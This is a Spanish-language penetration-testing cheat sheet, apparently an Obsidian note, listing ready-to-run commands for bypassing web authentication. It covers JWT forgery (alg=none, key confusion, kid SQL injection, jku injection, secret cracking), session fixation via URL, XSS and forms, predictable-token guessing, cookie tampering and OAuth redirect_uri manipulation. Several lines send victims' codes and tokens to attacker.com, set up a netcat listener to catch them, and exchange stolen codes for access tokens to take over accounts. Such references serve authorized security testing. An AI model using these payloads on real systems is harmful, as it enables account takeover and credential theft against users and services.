---
aliases:
  - Session Hijacking
  - JWT Bypass
  - OAuth redirect_uri
  - Predictable Tokens
tags:
  - vuln/auth-bypass
  - technique/credential-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Authentication & Authorization Bypass]]"
  - "[[JWT Attacks]]"
---
# Auth Bypass - Tokens y Sessions

***

## JWT Bypass (Quick Reference)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 jwt_tool.py $JWT -X a` | alg=none bypass auto | Server acepta `none`. |
| `python3 jwt_tool.py $JWT -X k -pk pubkey.pem` | RS256 → HS256 confusion | Pubkey disponible. |
| `hashcat -m 16500 jwt.txt rockyou.txt` | Weak HS256 secret bruteforce | Secret < 10 chars. |
| `python3 jwt_tool.py $JWT -I -hc kid -hv "' UNION SELECT 'AAAAAA' -- "` | kid SQLi injection | Backend usa kid en SQL. |
| `python3 jwt_tool.py $JWT -I -hc kid -hv "../../../../dev/null"` | kid path traversal — empty key | File-backed key. |
| `python3 jwt_tool.py $JWT -X s -ju http://attacker/jwks.json -pk priv.pem` | jku header injection | Atacante hostea JWKS. |
| `python3 jwt_tool.py $JWT -X i` | jwk embedded injection | No requiere infra externa. |
| `python3 jwt_tool.py $JWT -I -pc role -pv admin` | Claim manipulation + resign | Combine con weak validation. |
| `curl -H "Authorization: Bearer $FORGED_JWT" https://target/api/admin` | Test forged JWT | Post-forge validation. |
| `curl -s https://target/.well-known/jwks.json \| jq` | Obtener pública para alg confusion | Discovery. |
^auth-tokens-jwt

___

## Session Fixation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl https://target/login?PHPSESSID=ATTACKER_SET` y víctima abre link | Force SID via URL — víctima auth con SID conocido | App acepta SID en URL. |
| `<script>document.cookie="session=ATTACKER_SET; Domain=.target.com"</script>` (XSS) | Force cookie via XSS | Subdomain XSS combo. |
| Subdomain takeover + `Set-Cookie: session=ATK; Domain=.target.com` | Cross-subdomain cookie tossing | SDT chain. |
| `curl -b "session=ATTACKER_SET" https://target/login -d "user=victim&pass=x"` (víctima authentica con SID atacante) | Post-login SID kept — atacante uses same | Backend no regenera SID post-login. |
| `<form action="https://target/login" method="POST"><input name="JSESSIONID" value="ATTACKER">...</form>` | Force SID via form | Hidden form field session. |
| `curl https://target/?next=https://attacker.com/cookie-set` + listener que set cookie | Open Redirect chain | Combo OR + fixation. |
| Inspect `curl -sI https://target/login` y verificar si Set-Cookie cambia post-login | Confirm fixation vulnerable | Pre-attack check. |
^auth-tokens-fixation

___

## Predictable Tokens

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 -c "import uuid; print(uuid.uuid1())"` y comparar con tokens capturados | Predict UUIDv1 timestamp+MAC-based | App usa UUIDv1. |
| `for i in {1..100}; do curl -s https://target/api/reset -d "email=test$i@x.z" \| grep -oE 'token=[A-Za-z0-9]+'; done \| sort -u` | Identificar pattern incremental | Counter-based tokens. |
| `python3 -c "import hashlib; print(hashlib.md5(b'1234567890').hexdigest())"` | Test si token = MD5(known_input) | Hash-based predictable. |
| `for ts in $(seq 1700000000 1700000060); do python3 -c "import hashlib; print(hashlib.md5(b'${ts}user1'.hexdigest())"; done` | Brute timestamp + user combos | Time-based hash tokens. |
| `curl -sL https://target/reset?token=AAA \| grep -oE 'token=[^"]+'` | Extract leaked token desde HTML | Token leak in HTML. |
| Inspect Referer logs en attacker.com post-victim-click | Token leak via Referer | URL con token. |
| `curl -sI https://target/login \| grep -i set-cookie` y analizar entropy | Session ID entropy analysis | Predictability check. |
| `entropy < captured_tokens.txt` | Statistical entropy analysis | Bulk token analysis. |
^auth-tokens-predictable

___

## Cookie Tampering

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -b "role=admin" https://target/` | Cleartext role cookie tampering | Direct cookie value. |
| `curl -b "user_id=2" https://target/` (era 1) | IDOR via cookie value | Cookie tied to ID. |
| `curl -b "is_admin=1" https://target/` | Boolean flag tampering | Direct flag. |
| `python3 -c "import base64; c=base64.b64decode('$COOKIE_B64'); print(c)"` luego modify + re-encode | Decode base64 cookie + modify + re-encode | Encoded cookie. |
| `python3 -c "import json; print(json.loads('$COOKIE_JSON'))"` luego modify | JSON cookie parse + modify | JSON-encoded. |
| `hashcat -m 1450 cookie.txt rockyou.txt` (HMAC-SHA256 hash) | Crack signed cookie HMAC | Weak secret. |
| Re-encode cookie con cracked HMAC secret: `python3 -c "import hmac,hashlib; ..."` | Forge cookie con cracked secret | Post-crack. |
| `curl -b "session.path=/admin" https://target/admin` | Path-scoped cookie leak | Misconfig. |
| `<script>document.cookie</script>` desde subdomain takeover sub | Cross-domain cookie scope abuse | `Domain=.target.com` cookie. |
| Inspect `curl -sI https://target/login \| grep -i 'set-cookie'` para Secure/HttpOnly/SameSite | Cookie security attribute check | Pre-attack. |
^auth-tokens-cookie

___

## OAuth `redirect_uri` Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://idp.target.com/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://attacker.com/cb` | Direct redirect a attacker — no whitelist | redirect_uri sin validar. |
| `?redirect_uri=https://target.com.attacker.com/cb` | Suffix bypass | startsWith validator. |
| `?redirect_uri=https://target.com@attacker.com/cb` | Userinfo parser confusion | URL parser laxo. |
| `?redirect_uri=https://target.com/cb/../../attacker.com` | Path traversal escape | Path-based whitelist. |
| `?redirect_uri=https://taken.target.com/cb` (post-SDT) | Subdomain takeover combo | Wildcard + dangling. |
| `?response_type=token&redirect_uri=https://attacker.com` | Implicit flow → token directo en fragment | response_type=token habilitado. |
| `?redirect_uri=https://target.com/redirect?url=https://attacker.com` | OAuth + Open Redirect chain | Target con OR + IdP confía. |
| `nc -lvnp 443` en attacker.com → capturar `?code=...` | Listener post-redirect | Setup. |
| `curl -X POST https://idp/oauth/token -d "grant_type=authorization_code&code=$STOLEN&client_id=APP&redirect_uri=https://attacker.com/cb"` | Exchange code por access_token | Public client / leaked secret. |
| `curl -H "Authorization: Bearer $TOKEN" https://api.target.com/me` | Use access_token como victim | Final ATO step. |
^auth-tokens-oauth

***
